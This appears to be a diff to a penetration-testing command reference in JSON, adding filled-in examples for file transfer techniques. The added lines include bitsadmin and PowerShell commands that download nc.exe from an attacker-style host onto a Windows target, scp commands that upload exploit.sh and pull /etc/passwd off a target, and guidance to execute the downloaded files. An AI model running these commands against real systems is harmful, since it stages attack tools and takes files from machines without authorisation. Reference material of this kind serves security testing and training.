@@ -30,7 +30,8 @@
       },
       "methodology_guidance": {
         "after_success": "wget http://<LHOST>:<PORT>/<FILE> (on target)"
-      }
+      },
+      "filled_example": "php -S 0.0.0.0:8000"
     },
     {
       "id": "ruby-http-server",
@@ -59,7 +60,8 @@
       "next_steps": [],
       "methodology_guidance": {
         "after_success": "curl http://<LHOST>:<PORT>/<FILE> -o <FILE> (on target)"
-      }
+      },
+      "filled_example": "ruby -run -ehttpd . -p8000"
     },
     {
       "id": "scp-upload",
@@ -108,7 +110,8 @@
       },
       "methodology_guidance": {
         "after_success": "chmod +x on uploaded file Execute"
-      }
+      },
+      "filled_example": "scp exploit.sh user@192.168.1.1:/tmp/exploit.sh"
     },
     {
       "id": "scp-download",
@@ -153,7 +156,8 @@
       "next_steps": [],
       "methodology_guidance": {
         "after_success": "Analyze downloaded file"
-      }
+      },
+      "filled_example": "scp user@192.168.1.1:/etc/passwd ./passwd"
     },
     {
       "id": "tftp-upload",
@@ -191,7 +195,8 @@
       },
       "methodology_guidance": {
         "after_success": "Verify file transfer"
-      }
+      },
+      "filled_example": "tftp -i 10.10.14.1 PUT data.txt"
     },
     {
       "id": "impacket-smbserver",
@@ -228,7 +233,8 @@
       },
       "methodology_guidance": {
         "after_success": "copy \\\\<LHOST>\\<SHARE_NAME>\\<FILE> <DEST> (on Windows target)"
-      }
+      },
+      "filled_example": "impacket-smbserver share . -smb2support"
     },
     {
       "id": "bitsadmin-download",
@@ -273,7 +279,8 @@
       },
       "methodology_guidance": {
         "after_success": "Execute downloaded file"
-      }
+      },
+      "filled_example": "bitsadmin /transfer myDownload /download /priority high http://10.10.14.1/nc.exe C:\\Temp\\nc.exe"
     },
     {
       "id": "powershell-wget",
@@ -315,7 +322,8 @@
       "next_steps": [],
       "methodology_guidance": {
         "after_success": "Execute downloaded file"
-      }
+      },
+      "filled_example": "powershell wget http://10.10.14.1/nc.exe -OutFile C:\\Temp\\nc.exe"
     },
     {
       "id": "powershell-invoke-webrequest",
@@ -359,7 +367,8 @@
       },
       "methodology_guidance": {
         "after_success": "Execute downloaded file"
-      }
+      },
+      "filled_example": "powershell -c \"Invoke-WebRequest -Uri 'http://10.10.14.1/nc.exe' -OutFile 'C:\\Temp\\nc.exe'\""
     }
   ]
 }
